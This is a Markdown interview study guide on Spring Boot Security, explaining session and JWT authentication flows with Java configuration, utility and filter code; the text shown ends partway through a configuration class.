# 🔐 Spring Boot Security - MUST KNOW

**Priority:** 🔴 CRITICAL ⭐ HIGH INTERVIEW FOCUS | **Interview Weight:** EXTREMELY HIGH

---

## 📑 Table of Contents

1. [Spring Security Basics](#61-spring-security-basics)
   - [Authentication vs Authorization](#-authentication-vs-authorization)
   - [Setup](#-setup)
   - [Security Filter Chain](#-security-filter-chain--critical-concept)
2. [Authentication Methods](#62-authentication-methods)
   - [In-Memory Authentication](#-in-memory-authentication-devtesting-only)
   - [Database Authentication](#-database-authentication-production--recommended)
   - [JWT Authentication](#-jwt-authentication--most-important-for-rest-apis)
3. [Role-based Access Control](#63-role-based-access-control)
   - [@PreAuthorize, @Secured](#-preauthorize-secured)
4. [Password Encoding](#64-password-encoding)
   - [BCrypt](#-bcrypt-recommended)
5. [CSRF, CORS](#65-csrf-cors)
   - [CSRF](#-csrf-cross-site-request-forgery)
   - [CORS](#-cors-cross-origin-resource-sharing)
6. [Common Interview Questions](#-common-interview-questions)
7. [Quick Revision Checklist](#-quick-revision-checklist)
8. [Practice Exercise](#-practice-exercise)

---

## 6.1 Spring Security Basics

### 🔹 Authentication vs Authorization

**Authentication** - "Who are you?" (Identity verification)
- Login with username/password
- Token validation
- Biometric verification

**Authorization** - "What can you do?" (Permission verification)
- Role-based access control (RBAC)
- Resource permissions
- Feature flags

---

### 🔹 Setup

```xml
<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-security</artifactId>
</dependency>
```

**Default Behavior (After adding dependency):**
- ✅ All endpoints are secured
- ✅ Default user: `user`
- ✅ Password: Auto-generated in console logs
- ✅ Login page at `/login`

```
Using generated security password: a1b2c3d4-e5f6-7890-abcd-ef1234567890
```

---

### 🔹 Security Filter Chain ⭐ CRITICAL CONCEPT

**How Spring Security Works:**

```
HTTP Request
    ↓
┌─────────────────────────────────────┐
│   Security Filter Chain             │
│   1. Authentication Filter          │ ← Validates credentials
│   2. Authorization Filter           │ ← Checks permissions
│   3. Exception Translation Filter   │ ← Handles security exceptions
│   4. CSRF Filter                    │ ← CSRF protection
│   5. Session Management Filter      │ ← Manages sessions
│   ... (more filters)                │
└─────────────────────────────────────┘
    ↓
Your Controller
```

---

## 6.2 Authentication Methods

---

## 🎯 Overview: 3 Ways to Authenticate in Spring Boot

Spring Boot provides three primary authentication mechanisms, each suited for different use cases:

| Method | Storage | Use Case | Scalability | Production Ready |
|--------|---------|----------|-------------|------------------|
| **In-Memory** | Application Memory | Dev/Testing | ❌ Poor | ❌ No |
| **Database** | Database (MySQL/PostgreSQL) | Web Applications | ✅ Good | ✅ Yes |
| **JWT** | Client-side (Token) | REST APIs/Microservices | ✅ Excellent | ✅ Yes |

---

## 🔄 Authentication Flow Comparison

### 1️⃣ In-Memory Authentication Flow (Session-Based)

```
┌────────────────────────────────────────────────────────────────┐
│               IN-MEMORY AUTHENTICATION FLOW                    │
└────────────────────────────────────────────────────────────────┘

Step 1: User Request (Unauthenticated)
─────────────────────────────────────
User → http://localhost:8080/dashboard
   ↓
Security Filter Chain intercepts request
   ↓
Check: Is user authenticated? ✗ NO
   ↓
Redirect → /login (Form Login Page)

Step 2: User Submits Credentials
──────────────────────────────────
User fills form:
  - Username: "john"
  - Password: "password123"
   ↓
POST /login with form data
   ↓
UsernamePasswordAuthenticationFilter catches request

Step 3: Load User from Memory
───────────────────────────────
AuthenticationManager
   ↓
UserDetailsService.loadUserByUsername("john")
   ↓
InMemoryUserDetailsManager searches in memory
   ↓
Found user: 
  {
    username: "john",
    password: "$2a$10$xyz..." (BCrypt hash),
    roles: ["USER"]
  }

Step 4: Password Validation
─────────────────────────────
PasswordEncoder.matches(
  "password123",           ← Raw password from form
  "$2a$10$xyz..."         ← Hashed password from memory
)
   ↓
Result: ✅ MATCH!

Step 5: Create Authentication Object
──────────────────────────────────────
UsernamePasswordAuthenticationToken created
  - Principal: UserDetails (username, roles)
  - Credentials: null (cleared for security)
  - Authorities: [ROLE_USER]
   ↓
Stored in SecurityContextHolder (Thread-local)

Step 6: Create HTTP Session
─────────────────────────────
Server creates session:
  - Session ID: "ABC123XYZ"
  - Stores Authentication in session
  - Sends JSESSIONID cookie to browser
   ↓
Cookie: JSESSIONID=ABC123XYZ

Step 7: Redirect to Protected Resource
────────────────────────────────────────
302 Redirect → /dashboard
   ↓
User's browser follows redirect WITH session cookie

Step 8: Subsequent Requests (Authenticated)
─────────────────────────────────────────────
User → http://localhost:8080/dashboard
Headers: Cookie: JSESSIONID=ABC123XYZ
   ↓
Security Filter Chain:
  - Reads JSESSIONID cookie
  - Loads Authentication from session
  - Sets in SecurityContextHolder
   ↓
Check: Is user authenticated? ✅ YES
   ↓
Access GRANTED → Execute controller method
```

**🎯 Key Points:**
- ✅ Users stored in **application memory** (no database)
- ✅ Passwords **encrypted** with BCryptPasswordEncoder
- ✅ **Session-based** (JSESSIONID cookie)
- ❌ Users **lost on restart**
- ❌ Cannot scale horizontally

---

### 2️⃣ Database Authentication Flow (Session-Based)

```
┌────────────────────────────────────────────────────────────────┐
│               DATABASE AUTHENTICATION FLOW                     │
└────────────────────────────────────────────────────────────────┘

Step 1: User Registration (One-time)
──────────────────────────────────────
User → POST /api/auth/register
{
  "username": "john",
  "email": "john@example.com",
  "password": "password123"
}
   ↓
Server:
  1. Check if username/email exists in database
  2. Hash password: BCrypt.encode("password123")
     → "$2a$10$xyz..."
  3. Save to database:
     INSERT INTO users (username, password, email, roles)
     VALUES ('john', '$2a$10$xyz...', 'john@example.com', 'USER')
   ↓
Response: 201 Created → "User registered successfully"

Step 2: User Login Request
────────────────────────────
User → POST /login
{
  "username": "john",
  "password": "password123"
}
   ↓
UsernamePasswordAuthenticationFilter catches request

Step 3: Load User from Database
─────────────────────────────────
AuthenticationManager
   ↓
CustomUserDetailsService.loadUserByUsername("john")
   ↓
UserRepository.findByUsername("john")
   ↓
SQL Query:
SELECT * FROM users WHERE username = 'john'
   ↓
Found user:
  {
    id: 1,
    username: "john",
    password: "$2a$10$xyz...",
    email: "john@example.com",
    roles: ["USER"],
    enabled: true
  }
   ↓
Convert to UserDetails object

Step 4: Password Validation
─────────────────────────────
PasswordEncoder.matches(
  "password123",           ← Raw password from login form
  "$2a$10$xyz..."         ← Hashed password from database
)
   ↓
Result: ✅ MATCH!

Step 5: Create Authentication Object
──────────────────────────────────────
UsernamePasswordAuthenticationToken created
  - Principal: UserDetails from database
  - Authorities: [ROLE_USER]
   ↓
Stored in SecurityContextHolder

Step 6: Create HTTP Session
─────────────────────────────
Server creates session:
  - Session ID: "DEF456ABC"
  - Stores Authentication in session (or Redis)
  - Sends JSESSIONID cookie
   ↓
Cookie: JSESSIONID=DEF456ABC

Step 7: Subsequent Requests
─────────────────────────────
User → GET /api/users/profile
Headers: Cookie: JSESSIONID=DEF456ABC
   ↓
Security Filter Chain:
  - Reads JSESSIONID
  - Loads Authentication from session
  - Sets in SecurityContextHolder
   ↓
Access GRANTED → Execute controller

Step 8: Logout
───────────────
User → POST /logout
   ↓
Server:
  - Invalidates session
  - Deletes JSESSIONID cookie
  - Clears SecurityContext
   ↓
User is logged out
```

**🎯 Key Points:**
- ✅ Users stored in **database** (persistent)
- ✅ **Session-based** authentication
- ✅ **Scalable** (use Redis for shared sessions)
- ✅ **Production-ready**
- ❌ Requires database connection
- ❌ Session management overhead

---

### 3️⃣ JWT Authentication Flow (Stateless)

```
┌────────────────────────────────────────────────────────────────┐
│                  JWT AUTHENTICATION FLOW                       │
└────────────────────────────────────────────────────────────────┘

Step 1: User Registration (One-time)
──────────────────────────────────────
User → POST /api/auth/register
{
  "username": "john",
  "email": "john@example.com",
  "password": "password123"
}
   ↓
Server:
  1. Validate input
  2. Hash password with BCrypt
  3. Save to database
   ↓
Response: 201 Created

Step 2: User Login & Token Generation
───────────────────────────────────────
User → POST /api/auth/login
{
  "username": "john",
  "password": "password123"
}
   ↓
AuthenticationManager validates credentials
   ↓
Load user from database
   ↓
Password matches? ✅ YES
   ↓
Generate JWT Token:

Header:
{
  "alg": "HS256",
  "typ": "JWT"
}

Payload:
{
  "sub": "john",           ← Subject (username)
  "roles": ["USER"],       ← Custom claim
  "iat": 1695000000,      ← Issued at
  "exp": 1695086400       ← Expires in 24 hours
}

Signature:
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  SECRET_KEY
)
   ↓
Final JWT Token:
eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJqb2huIi...xyz123
   ↓
Response:
{
  "token": "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJqb2huIi...xyz123"
}

Step 3: Client Stores Token
─────────────────────────────
Client receives token
   ↓
Stores in localStorage/sessionStorage
localStorage.setItem("token", "eyJhbGc...")

Step 4: Accessing Protected Resources
───────────────────────────────────────
User → GET /api/users/profile
Headers: 
  Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
   ↓
JwtAuthenticationFilter intercepts request

Step 5: Token Validation
──────────────────────────
JwtAuthenticationFilter:
  1. Extract token from Authorization header
     → Remove "Bearer " prefix
  
  2. Parse JWT token:
     → Extract header, payload, signature
  
  3. Verify signature:
     HMACSHA256(header + payload, SECRET_KEY)
     → Compare with token's signature
     → Signature valid? ✅ YES
  
  4. Check expiration:
     → Current time: 1695012000
     → Token expires: 1695086400
     → Expired? ✗ NO
  
  5. Extract username from payload:
     → "john"
  
  6. Load user from database:
     → Get current roles/permissions
     → Check if user is enabled
  
  7. Create Authentication object:
     UsernamePasswordAuthenticationToken
       - Principal: UserDetails
       - Authorities: [ROLE_USER]
  
  8. Set in SecurityContextHolder:
     SecurityContextHolder
       .getContext()
       .setAuthentication(authToken)

Step 6: Authorization Check
─────────────────────────────
FilterSecurityInterceptor:
  - Check if user has required role
  - Endpoint /api/users/profile requires ROLE_USER
  - User has ROLE_USER? ✅ YES
   ↓
Access GRANTED → Execute controller

Step 7: No Session Created!
─────────────────────────────
❌ No HTTP session
❌ No JSESSIONID cookie
✅ Completely STATELESS
✅ Each request is independent

Step 8: Subsequent Requests
─────────────────────────────
Every request repeats Step 4-6:
  - Extract JWT from header
  - Validate signature
  - Check expiration
  - Set authentication
  - Grant/Deny access

Step 9: Token Expiration
─────────────────────────
After 24 hours, token expires
   ↓
User → GET /api/users/profile
Headers: Authorization: Bearer <expired_token>
   ↓
JwtAuthenticationFilter:
  - Parse token
  - Check expiration: ❌ EXPIRED
   ↓
Response: 403 Forbidden
Message: "Token expired"
   ↓
Client must re-login to get new token

Step 10: Logout (Client-side)
───────────────────────────────
User clicks "Logout"
   ↓
Client:
  - Deletes token from localStorage
    localStorage.removeItem("token")
   ↓
User is logged out
(Server doesn't need to do anything!)
```

**🎯 Key Points:**
- ✅ **Stateless** (no server-side session)
- ✅ **Scalable** (perfect for microservices)
- ✅ **Fast** (no database lookup for each request)
- ✅ **Mobile-friendly**
- ❌ **Logout** requires token blacklist
- ❌ **Token revocation** is difficult

---

## 📊 When to Use Each Method?

### Use In-Memory Authentication When:
- 🧪 Developing/Testing locally
- 📚 Learning Spring Security
- 🎯 Building POC (Proof of Concept)
- ❌ NEVER in production!

### Use Database Authentication When:
- 🌐 Building traditional web applications
- 👤 Need user management (CRUD)
- 🔐 Session-based authentication is acceptable
- 📱 Building monolithic applications

### Use JWT Authentication When:
- 🚀 Building REST APIs
- 📊 Building microservices architecture
- 📱 Building mobile applications
- 🌍 Need cross-domain authentication
- ⚡ Need horizontal scalability
- ☁️ Building cloud-native applications

---

## 🔒 Security Comparison

| Aspect | In-Memory | Database | JWT |
|--------|-----------|----------|-----|
| **Password Storage** | Hashed (BCrypt) | Hashed (BCrypt) | Hashed (BCrypt) |
| **Session Management** | Server-side | Server-side | ❌ None (stateless) |
| **Scalability** | ❌ Poor | ⚠️ Medium | ✅ Excellent |
| **Logout** | ✅ Easy | ✅ Easy | ❌ Complex |
| **Token Revocation** | ✅ Easy | ✅ Easy | ❌ Difficult |
| **Mobile Support** | ❌ Poor | ⚠️ Medium | ✅ Excellent |
| **Production Ready** | ❌ No | ✅ Yes | ✅ Yes |

---

### 🔹 In-Memory Authentication (Dev/Testing Only)

```java
@Configuration
@EnableWebSecurity
public class SecurityConfig {
    
    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
        http
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/public/**").permitAll()
                .requestMatchers("/admin/**").hasRole("ADMIN")
                .anyRequest().authenticated()
            )
            .formLogin(Customizer.withDefaults())
            .httpBasic(Customizer.withDefaults());
        
        return http.build();
    }
    
    @Bean
    public UserDetailsService userDetailsService() {
        UserDetails user = User.builder()
                .username("user")
                .password(passwordEncoder().encode("password"))
                .roles("USER")
                .build();
        
        UserDetails admin = User.builder()
                .username("admin")
                .password(passwordEncoder().encode("admin"))
                .roles("ADMIN", "USER")
                .build();
        
        return new InMemoryUserDetailsManager(user, admin);
    }
    
    @Bean
    public PasswordEncoder passwordEncoder() {
        return new BCryptPasswordEncoder();
    }
}
```

---

### 🔹 Database Authentication (Production) ⭐ RECOMMENDED

**User Entity:**
```java
@Entity
@Table(name = "users")
public class User {
    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    private Long id;
    
    @Column(unique = true, nullable = false)
    private String username;
    
    @Column(unique = true, nullable = false)
    private String email;
    
    @Column(nullable = false)
    private String password;  // BCrypt encoded
    
    @ElementCollection(fetch = FetchType.EAGER)
    @CollectionTable(name = "user_roles", joinColumns = @JoinColumn(name = "user_id"))
    @Column(name = "role")
    private Set<String> roles = new HashSet<>();
    
    private boolean enabled = true;
    
    // Getters and Setters
}
```

**UserRepository:**
```java
@Repository
public interface UserRepository extends JpaRepository<User, Long> {
    Optional<User> findByUsername(String username);
    Optional<User> findByEmail(String email);
    boolean existsByUsername(String username);
    boolean existsByEmail(String email);
}
```

**UserDetailsService Implementation:**
```java
@Service
public class CustomUserDetailsService implements UserDetailsService {
    
    private final UserRepository userRepository;
    
    public CustomUserDetailsService(UserRepository userRepository) {
        this.userRepository = userRepository;
    }
    
    @Override
    public UserDetails loadUserByUsername(String username) throws UsernameNotFoundException {
        User user = userRepository.findByUsername(username)
                .orElseThrow(() -> new UsernameNotFoundException("User not found: " + username));
        
        return org.springframework.security.core.userdetails.User.builder()
                .username(user.getUsername())
                .password(user.getPassword())
                .roles(user.getRoles().toArray(new String[0]))
                .disabled(!user.isEnabled())
                .build();
    }
}
```

**Security Configuration:**
```java
@Configuration
@EnableWebSecurity
public class SecurityConfig {
    
    private final CustomUserDetailsService userDetailsService;
    
    public SecurityConfig(CustomUserDetailsService userDetailsService) {
        this.userDetailsService = userDetailsService;
    }
    
    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
        http
            .csrf(csrf -> csrf.disable())  // Disable for REST APIs
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/api/auth/**").permitAll()
                .requestMatchers("/api/admin/**").hasRole("ADMIN")
                .requestMatchers("/api/user/**").hasAnyRole("USER", "ADMIN")
                .anyRequest().authenticated()
            )
            .userDetailsService(userDetailsService)
            .sessionManagement(session -> 
                session.sessionCreationPolicy(SessionCreationPolicy.STATELESS)
            );
        
        return http.build();
    }
    
    @Bean
    public PasswordEncoder passwordEncoder() {
        return new BCryptPasswordEncoder();
    }
    
    @Bean
    public AuthenticationManager authenticationManager(
        AuthenticationConfiguration config
    ) throws Exception {
        return config.getAuthenticationManager();
    }
}
```

---

### 🔹 JWT Authentication ⭐ MOST IMPORTANT FOR REST APIs

---

## 🎯 What is JWT? (JSON Web Token)

**JWT** is an **open standard (RFC 7519)** that defines a compact and self-contained way to securely transmit information between parties as a JSON object.

### Why JWT for REST APIs?
- ✅ **Stateless** - Server doesn't need to store session data
- ✅ **Scalable** - Works perfectly with microservices
- ✅ **Compact** - Can be sent via URL, POST parameter, or HTTP header
- ✅ **Self-contained** - Carries all user information
- ✅ **Cross-domain** - Works across different domains (CORS friendly)
- ✅ **Mobile-friendly** - Perfect for mobile apps

---

## 🏗️ JWT Structure (3 Parts)

A JWT looks like this:
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

**Broken down:**
```
HEADER.PAYLOAD.SIGNATURE
```

### 1️⃣ Header (Algorithm & Token Type)
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```
- **alg** - Signing algorithm (HS256, RS256, etc.)
- **typ** - Token type (always JWT)

### 2️⃣ Payload (Claims/Data)
```json
{
  "sub": "1234567890",
  "name": "John Doe",
  "email": "john@example.com",
  "roles": ["USER", "ADMIN"],
  "iat": 1516239022,
  "exp": 1516325422
}
```

**Standard Claims:**
- **sub** - Subject (usually user ID)
- **iat** - Issued at (timestamp)
- **exp** - Expiration time (timestamp)
- **iss** - Issuer
- **aud** - Audience

**Custom Claims:** Any data you want (roles, permissions, email, etc.)

⚠️ **WARNING:** Don't put sensitive data (passwords, credit cards) in JWT - it's Base64 encoded, NOT encrypted!

### 3️⃣ Signature (Verification)
```
HMACSHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),
  secret
)
```
- Ensures token hasn't been tampered with
- Created using header, payload, and secret key

---

## 🔄 How JWT Authentication Works (Flow)

```
┌─────────┐                                  ┌─────────┐
│ Client  │                                  │ Server  │
│(Browser)│                                  │         │
└────┬────┘                                  └────┬────┘
     │                                            │
     │  1. POST /api/auth/login                  │
     │     {username, password}                  │
     ├──────────────────────────────────────────>│
     │                                            │
     │                                            │ 2. Validate credentials
     │                                            │    in database
     │                                            │
     │  3. Return JWT Token                      │
     │     {token: "eyJhbGc..."}                 │
     │<──────────────────────────────────────────┤
     │                                            │
     │  4. Store token (localStorage/cookie)     │
     │                                            │
     │                                            │
     │  5. GET /api/users                        │
     │     Authorization: Bearer eyJhbGc...      │
     ├──────────────────────────────────────────>│
     │                                            │
     │                                            │ 6. Verify JWT signature
     │                                            │    Extract user info
     │                                            │    Check authorization
     │                                            │
     │  7. Return protected data                 │
     │<──────────────────────────────────────────┤
     │                                            │
```

**Step-by-Step Explanation:**

1. **User Login** - Client sends username/password
2. **Server Validates** - Checks credentials against database
3. **Generate JWT** - Server creates JWT with user info and signs it
4. **Client Stores** - Token saved in localStorage/sessionStorage
5. **Send Token** - Client includes token in Authorization header for subsequent requests
6. **Server Verifies** - Validates signature and extracts user info
7. **Access Granted** - If valid, server processes request

---

## 🚀 JWT vs Session-Based Authentication

| Feature | JWT (Stateless) | Session (Stateful) |
|---------|----------------|-------------------|
| **Storage** | Client-side (token) | Server-side (session store) |
| **Scalability** | ✅ Excellent (no server state) | ❌ Challenging (shared session store) |
| **Performance** | ✅ Fast (no DB lookup) | ❌ Slower (DB/Redis lookup) |
| **Mobile Apps** | ✅ Perfect | ❌ Complicated |
| **Microservices** | ✅ Ideal | ❌ Complex |
| **Logout** | ❌ Complex (need blacklist) | ✅ Simple (destroy session) |
| **Token Revocation** | ❌ Difficult | ✅ Easy |
| **Best For** | REST APIs, microservices | Traditional web apps |

---

## 📦 Spring Boot JWT Implementation

### Step 1: Add Dependencies

**Add Dependency:**
```xml
<dependency>
    <groupId>io.jsonwebtoken</groupId>
    <artifactId>jjwt-api</artifactId>
    <version>0.12.3</version>
</dependency>
<dependency>
    <groupId>io.jsonwebtoken</groupId>
    <artifactId>jjwt-impl</artifactId>
    <version>0.12.3</version>
    <scope>runtime</scope>
</dependency>
<dependency>
    <groupId>io.jsonwebtoken</groupId>
    <artifactId>jjwt-jackson</artifactId>
    <version>0.12.3</version>
    <scope>runtime</scope>
</dependency>
```

### Step 2: Configure JWT Properties

**application.properties:**
```properties
# JWT Configuration
jwt.secret=mySecretKeyThatIsAtLeast32CharactersLongForHS256Algorithm
jwt.expiration=86400000
# 86400000 ms = 24 hours
# 3600000 ms = 1 hour
# 604800000 ms = 7 days

# Optional: Refresh token expiration (longer)
jwt.refresh.expiration=2592000000
# 2592000000 ms = 30 days
```

**🔐 Security Best Practices for JWT Secret:**
- ✅ Use at least 256 bits (32 characters) for HS256
- ✅ Generate random secret: `openssl rand -base64 32`
- ✅ Store in environment variables, never hardcode
- ✅ Use different secrets for dev/staging/production
- ✅ Rotate secrets periodically

**Better approach - Environment Variable:**
```properties
jwt.secret=${JWT_SECRET:defaultSecretForDevOnly}
jwt.expiration=${JWT_EXPIRATION:86400000}
```

---

### Step 3: Create JWT Utility Class

**JWT Utility Class - Complete Explanation:**
```java
@Component
public class JwtUtil {
    
    @Value("${jwt.secret}")
    private String secret;
    
    @Value("${jwt.expiration}")
    private Long expiration;
    
    /**
     * Get signing key for JWT
     * Converts Base64 encoded secret to HMAC key
     */
    private Key getSigningKey() {
        byte[] keyBytes = Decoders.BASE64.decode(secret);
        return Keys.hmacShaKeyFor(keyBytes);
    }
    
    /**
     * Generate JWT token with username only
     * Simple version for basic authentication
     * 
     * @param username - User's username
     * @return JWT token string
     */
    public String generateToken(String username) {
        return Jwts.builder()
                .subject(username)                                          // Set username as subject
                .issuedAt(new Date())                                       // Current timestamp
                .expiration(new Date(System.currentTimeMillis() + expiration))  // Expiry time
                .signWith(getSigningKey())                                  // Sign with secret key
                .compact();                                                 // Build and serialize
    }
    
    /**
     * Generate JWT token with UserDetails (includes roles/authorities)
     * Advanced version with custom claims
     * 
     * @param userDetails - Spring Security UserDetails object
     * @return JWT token string with roles embedded
     */
    public String generateToken(UserDetails userDetails) {
        // Create custom claims map
        Map<String, Object> claims = new HashMap<>();
        
        // Extract roles/authorities from UserDetails
        claims.put("roles", userDetails.getAuthorities().stream()
                .map(GrantedAuthority::getAuthority)
                .collect(Collectors.toList()));
        
        // You can add more custom claims
        // claims.put("email", user.getEmail());
        // claims.put("userId", user.getId());
        
        return Jwts.builder()
                .claims(claims)                                             // Add custom claims
                .subject(userDetails.getUsername())                         // Set username
                .issuedAt(new Date())                                       // Issue time
                .expiration(new Date(System.currentTimeMillis() + expiration))  // Expiry
                .signWith(getSigningKey())                                  // Sign
                .compact();
    }
    
    /**
     * Extract username from JWT token
     * 
     * @param token - JWT token string
     * @return username
     */
    public String extractUsername(String token) {
        return extractClaim(token, Claims::getSubject);
    }
    
    /**
     * Extract expiration date from token
     * 
     * @param token - JWT token string
     * @return Expiration date
     */
    public Date extractExpiration(String token) {
        return extractClaim(token, Claims::getExpiration);
    }
    
    /**
     * Extract specific claim from token using a resolver function
     * Generic method to extract any claim
     * 
     * @param token - JWT token
     * @param claimsResolver - Function to extract specific claim
     * @return Extracted claim value
     */
    public <T> T extractClaim(String token, Function<Claims, T> claimsResolver) {
        final Claims claims = extractAllClaims(token);
        return claimsResolver.apply(claims);
    }
    
    /**
     * Extract all claims from JWT token
     * Parses and validates the token
     * 
     * @param token - JWT token string
     * @return Claims object containing all token data
     * @throws JwtException if token is invalid/expired
     */
    private Claims extractAllClaims(String token) {
        return Jwts.parser()
                .verifyWith((SecretKey) getSigningKey())    // Verify signature
                .build()
                .parseSignedClaims(token)                    // Parse token
                .getPayload();                               // Get payload (claims)
    }
    
    /**
     * Check if token is expired
     * 
     * @param token - JWT token string
     * @return true if expired, false otherwise
     */
    private Boolean isTokenExpired(String token) {
        return extractExpiration(token).before(new Date());
    }
    
    /**
     * Validate JWT token
     * Checks if username matches and token is not expired
     * 
     * @param token - JWT token string
     * @param userDetails - UserDetails to validate against
     * @return true if valid, false otherwise
     */
    public Boolean validateToken(String token, UserDetails userDetails) {
        final String username = extractUsername(token);
        return (username.equals(userDetails.getUsername()) && !isTokenExpired(token));
    }
    
    /**
     * Extract roles from token
     * Custom method to get roles from JWT payload
     * 
     * @param token - JWT token string
     * @return List of role strings
     */
    public List<String> extractRoles(String token) {
        Claims claims = extractAllClaims(token);
        return claims.get("roles", List.class);
    }
}
```

**🎯 Key Points About JWT Utility:**

1. **Token Generation:**
   - Creates JWT with username (subject)
   - Adds issued-at time (iat)
   - Sets expiration time (exp)
   - Signs with secret key

2. **Token Validation:**
   - Parses token and verifies signature
   - Checks if username matches
   - Ensures token hasn't expired

3. **Claim Extraction:**
   - Can extract any claim from token
   - Generic method using Function interface
   - No database lookup needed!

4. **Security:**
   - Uses HMAC-SHA256 for signing
   - Validates signature on every request
   - Automatically checks expiration

---

### Step 4: Create JWT Authentication Filter
**JWT Authentication Filter - Intercepts Every Request:**

```java
@Component
public class JwtAuthenticationFilter extends OncePerRequestFilter {
    
    private final JwtUtil jwtUtil;
    private final UserDetailsService userDetailsService;
    
    public JwtAuthenticationFilter(JwtUtil jwtUtil, UserDetailsService userDetailsService) {
        this.jwtUtil = jwtUtil;
        this.userDetailsService = userDetailsService;
    }
    
    /**
     * This method runs ONCE per request
     * Intercepts every HTTP request to validate JWT token
     * 
     * Flow:
     * 1. Extract JWT from Authorization header
     * 2. Validate JWT signature
     * 3. Extract username from token
     * 4. Load user details from database
     * 5. Set authentication in SecurityContext
     * 6. Continue filter chain
     */
    @Override
    protected void doFilterInternal(
        HttpServletRequest request,
        HttpServletResponse response,
        FilterChain filterChain
    ) throws ServletException, IOException {
        
        // Step 1: Get Authorization header
        // Format: "Bearer eyJhbGciOiJIUzI1NiJ9..."
        final String authHeader = request.getHeader("Authorization");
        
        // If no Authorization header or doesn't start with "Bearer ", skip JWT processing
        if (authHeader == null || !authHeader.startsWith("Bearer ")) {
            filterChain.doFilter(request, response);  // Continue to next filter
            return;
        }
        
        try {
            // Step 2: Extract JWT token (remove "Bearer " prefix)
            final String jwt = authHeader.substring(7);
            
            // Step 3: Extract username from token
            final String username = jwtUtil.extractUsername(jwt);
            
            // Step 4: Check if username exists and user is not already authenticated
            // SecurityContextHolder.getContext().getAuthentication() == null means not authenticated yet
            if (username != null && SecurityContextHolder.getContext().getAuthentication() == null) {
                
                // Step 5: Load user details from database
                UserDetails userDetails = userDetailsService.loadUserByUsername(username);
                
                // Step 6: Validate token (check signature and expiration)
                if (jwtUtil.validateToken(jwt, userDetails)) {
                    
                    // Step 7: Create authentication token
                    UsernamePasswordAuthenticationToken authToken = 
                        new UsernamePasswordAuthenticationToken(
                            userDetails,              // Principal (user info)
                            null,                     // Credentials (not needed after authentication)
                            userDetails.getAuthorities()  // Roles/Authorities
                        );
                    
                    // Step 8: Set additional details (IP address, session ID, etc.)
                    authToken.setDetails(new WebAuthenticationDetailsSource().buildDetails(request));
                    
                    // Step 9: Set authentication in SecurityContext
                    // This tells Spring Security that user is authenticated
                    SecurityContextHolder.getContext().setAuthentication(authToken);
                }
            }
        } catch (Exception e) {
            // Log error but don't stop the request
            logger.error("JWT authentication failed", e);
        }
        
        // Step 10: Continue filter chain (pass to next filter)
        filterChain.doFilter(request, response);
    }
}
```

**🔍 Filter Flow Visualization:**

```
HTTP Request
    ↓
┌─────────────────────────────────────────┐
│ JwtAuthenticationFilter                 │
│                                         │
│ 1. Check Authorization header           │
│    ✓ Present? Continue                  │
│    ✗ Absent? Skip to next filter        │
│                                         │
│ 2. Extract token (remove "Bearer ")    │
│                                         │
│ 3. Extract username from JWT            │
│                                         │
│ 4. Validate token signature             │
│    ✓ Valid? Continue                    │
│    ✗ Invalid? Skip authentication       │
│                                         │
│ 5. Load UserDetails from database       │
│                                         │
│ 6. Create Authentication object         │
│                                         │
│ 7. Set in SecurityContext               │
│    SecurityContextHolder.setAuth(...)   │
└─────────────────────────────────────────┘
    ↓
Next Filter (Authorization Filter)
    ↓
Your Controller
```

**🎯 Key Concepts:**

1. **OncePerRequestFilter:**
   - Ensures filter runs only once per request
   - Prevents multiple executions in complex filter chains

2. **SecurityContextHolder:**
   - Thread-local storage for authentication
   - Accessible throughout the request lifecycle
   - Cleared after request completes

3. **Why load UserDetails from DB?**
   - Get latest user status (enabled/disabled)
   - Get current roles/authorities
   - Could be cached for better performance

4. **Error Handling:**
   - Catches JWT parsing/validation errors
   - Logs error but doesn't block request
   - Lets Spring Security handle unauthorized access

---

### Step 5: Security Configuration with JWT
```java
@Configuration
@EnableWebSecurity
public class SecurityConfig {
    
    private final JwtAuthenticationFilter jwtAuthFilter;
    private final UserDetailsService userDetailsService;
    
    public SecurityConfig(
        JwtAuthenticationFilter jwtAuthFilter,
        UserDetailsService userDetailsService
    ) {
        this.jwtAuthFilter = jwtAuthFilter;
        this.userDetailsService = userDetailsService;
    }
    
    /**
     * Configure Security Filter Chain
     * This is where you define which endpoints are public/protected
     * and configure JWT authentication
     */
    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
        http
            // DISABLE CSRF for stateless REST APIs
            // CSRF protection not needed when using JWT (no cookies)
            .csrf(csrf -> csrf.disable())
            
            // Configure endpoint authorization
            .authorizeHttpRequests(auth -> auth
                // Public endpoints (no authentication required)
                .requestMatchers("/api/auth/**").permitAll()          // Login, register endpoints
                .requestMatchers("/api/public/**").permitAll()        // Public API endpoints
                .requestMatchers("/swagger-ui/**", "/v3/api-docs/**").permitAll()  // Swagger
                
                // Role-based endpoint protection
                .requestMatchers("/api/admin/**").hasRole("ADMIN")    // Only ADMIN role
                .requestMatchers("/api/user/**").hasAnyRole("USER", "ADMIN")  // USER or ADMIN
                
                // All other endpoints require authentication
                .anyRequest().authenticated()
            )
            
            // Configure session management
            // STATELESS = No session created or used (perfect for JWT)
            .sessionManagement(session -> 
                session.sessionCreationPolicy(SessionCreationPolicy.STATELESS)
            )
            
            // Add JWT filter BEFORE Spring Security's authentication filter
            // This ensures JWT is validated before authorization checks
            .addFilterBefore(jwtAuthFilter, UsernamePasswordAuthenticationFilter.class);
        
        return http.build();
    }
    
    /**
     * Password Encoder Bean
     * Used for encoding passwords during registration
     * and validating passwords during login
     */
    @Bean
